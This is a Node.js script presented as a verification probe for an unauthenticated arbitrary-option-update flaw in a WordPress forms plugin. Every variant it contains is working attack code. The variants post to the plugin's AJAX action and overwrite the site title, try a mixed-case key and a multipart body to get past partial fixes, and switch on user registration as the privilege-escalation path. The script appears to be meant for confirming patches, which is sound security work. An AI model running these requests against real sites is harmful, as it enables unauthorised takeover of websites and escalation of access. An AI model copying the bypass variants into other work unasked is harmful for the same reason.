#!/usr/bin/env node
// Exploit-verification probe for CVE-2026-90003 (Old Forms <= 1.4.2)
// Unauthenticated arbitrary options update via the of_save_field AJAX action
// (missing capability check + missing key allow-list).
//
// Usage: node probe.mjs <base-url>
// Exit 0  => target is exploitable (vulnerable)
// Exit 1  => target is NOT exploitable (appears fixed / inconclusive-safe)
//
// Only talks to <base-url>. Makes no filesystem writes. Restores any option
// values it changes, where practical.

const base = process.argv[2];
if (!base) {
  console.error('Usage: node probe.mjs <base-url>');
  process.exit(1);
}

const baseUrl = base.replace(/\/+$/, '');
const ajaxUrl = `${baseUrl}/wp-admin/admin-ajax.php`;

function rand(n = 8) {
  return Math.random().toString(36).slice(2, 2 + n);
}

async function postAjax(params) {
  const body = new URLSearchParams(params);
  try {
    const res = await fetch(ajaxUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    });
    const text = await res.text();
    return { ok: res.ok, status: res.status, text };
  } catch (e) {
    return { ok: false, status: 0, text: '', error: String(e) };
  }
}

async function getText(path) {
  try {
    const res = await fetch(`${baseUrl}${path}`, { method: 'GET' });
    return await res.text();
  } catch {
    return '';
  }
}

function ajaxSaysSuccess(resp) {
  if (!resp.text) return false;
  try {
    const j = JSON.parse(resp.text);
    return j && j.success === true;
  } catch {
    return false;
  }
}

async function attemptWriteOption(key, value, extra = {}) {
  return postAjax({ action: 'of_save_field', key, value, ...extra });
}

let vulnerable = false;
const findings = [];

// --- Variant 1: direct observable write to "blogname" (reflected in <title>) ---
// This probes the core "arbitrary option update" bug independently of any
// escalation-specific key blocklist a partial fix might add.
{
  const marker = `probe-${rand(10)}`;
  // Capture original title first so we can restore it afterwards if needed.
  const before = await getText('/');
  const titleMatch = before.match(/<title>([^<]*)<\/title>/i);
  const originalTitle = titleMatch ? titleMatch[1] : null;

  const resp = await attemptWriteOption('blogname', marker);
  const ajaxSuccess = ajaxSaysSuccess(resp);

  const after = await getText('/');
  const reflected = after.includes(marker);

  if (ajaxSuccess && reflected) {
    vulnerable = true;
    findings.push('blogname option overwritten and reflected on homepage (direct unauthenticated option write)');
  }

  // Restore original value if we changed it and know the original.
  if (reflected && originalTitle !== null) {
    await attemptWriteOption('blogname', originalTitle);
  }
}

// --- Variant 2: mixed-case key ("BlogName") to catch a fix that only
// lower-cases/validates the raw key AFTER an incomplete check, or a
// blocklist compared with strict case-sensitivity. sanitize_key() in core
// lower-cases regardless, but a custom patch might not. ---
{
  const marker = `probe-${rand(10)}`;
  const before = await getText('/');
  const titleMatch = before.match(/<title>([^<]*)<\/title>/i);
  const originalTitle = titleMatch ? titleMatch[1] : null;

  const resp = await attemptWriteOption('BlogName', marker);
  const ajaxSuccess = ajaxSaysSuccess(resp);

  const after = await getText('/');
  const reflected = after.includes(marker);

  if (ajaxSuccess && reflected) {
    vulnerable = true;
    findings.push('mixed-case key "BlogName" bypassed and overwrote blogname option');
  }

  if (reflected && originalTitle !== null) {
    await attemptWriteOption('blogname', originalTitle);
  }
}

// --- Variant 3: the privilege-escalation path itself -
// flip users_can_register on, observe via the public registration page,
// then restore it off. This covers a fix that only blocks the "blogname"
// style keys but still allows escalation-relevant ones (or vice versa). ---
{
  const regPageBefore = await getText('/wp-login.php?action=register');
  const wasOpenBefore = /notice-info message register|id="registerform"/i.test(regPageBefore);

  const resp = await attemptWriteOption('users_can_register', '1');
  const ajaxSuccess = ajaxSaysSuccess(resp);

  const regPageAfter = await getText('/wp-login.php?action=register');
  const isOpenAfter = /notice-info message register|id="registerform"/i.test(regPageAfter);

  // Only treat as a positive finding if the state actually flipped from
  // closed -> open, to avoid false positives on sites where registration
  // was already open for legitimate reasons.
  if (ajaxSuccess && isOpenAfter && !wasOpenBefore) {
    vulnerable = true;
    findings.push('users_can_register option flipped to enabled via unauthenticated AJAX call (registration page now open)');
  }

  // Best-effort restore: only touch it if we actually changed it.
  if (!wasOpenBefore && isOpenAfter) {
    await attemptWriteOption('users_can_register', '0');
  }
}

// --- Variant 4: alternate content-type (multipart/form-data) in case a
// fix only inspects $_POST assuming urlencoded parsing quirks, or in case
// a WAF-style filter only pattern-matches the urlencoded body. ---
{
  const marker = `probe-${rand(10)}`;
  const before = await getText('/');
  const titleMatch = before.match(/<title>([^<]*)<\/title>/i);
  const originalTitle = titleMatch ? titleMatch[1] : null;

  const form = new FormData();
  form.append('action', 'of_save_field');
  form.append('key', 'blogname');
  form.append('value', marker);

  let ajaxSuccess = false;
  try {
    const res = await fetch(ajaxUrl, { method: 'POST', body: form });
    const text = await res.text();
    try {
      const j = JSON.parse(text);
      ajaxSuccess = j && j.success === true;
    } catch {}
  } catch {}

  const after = await getText('/');
  const reflected = after.includes(marker);

  if (ajaxSuccess && reflected) {
    vulnerable = true;
    findings.push('multipart/form-data submission bypassed filter and overwrote blogname option');
  }

  if (reflected && originalTitle !== null) {
    await attemptWriteOption('blogname', originalTitle);
  }
}

if (vulnerable) {
  console.error('VULNERABLE: unauthenticated arbitrary option update succeeded.');
  for (const f of findings) console.error(' - ' + f);
  process.exit(0);
} else {
  console.error('NOT VULNERABLE: all attack variants were rejected by the target.');
  process.exit(1);
}
